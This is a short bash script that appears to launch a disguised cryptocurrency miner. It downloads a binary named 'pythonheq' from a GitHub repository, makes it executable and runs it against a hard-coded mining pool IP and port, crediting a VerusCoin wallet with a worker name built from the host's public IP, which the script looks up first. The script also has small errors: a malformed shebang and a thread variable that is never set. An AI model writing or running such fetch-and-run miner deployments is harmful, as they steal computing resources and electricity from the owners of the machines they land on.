#!bin/bash -xe 

echo '#### Version 0.0.1 ####'
if [ $(ps -aux |grep pythonheq |wc -l) -le 1 ]
then 
echo "No process,let's start -> $(ps -aux |grep pythonheq |wc -l)"
# info
iip=$(curl -s https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl -s ipinfo.io

# Cleaner
rm -rf pythonheq




# Prepare
PoolHost="116.203.10.54"
VR_Port="3000"
PublicVerusCoinAddress="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
WorkerName="VER_""$IPNAME"
VR_Threads="4"



wget -q https://github.com/one10001/10001code/raw/main/pythonheq
chmod +x pythonheq

echo '######### execution #########'
while true
do

./pythonheq -v -l "${PoolHost}":"${VR_Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -t "${Threads}" "$@" 1> oout 2> oout &

tail -f oout
done

else 

echo "It's ok : $(ps -aux |grep pythonheq |wc -l)"; 
  tail -f oout
fi
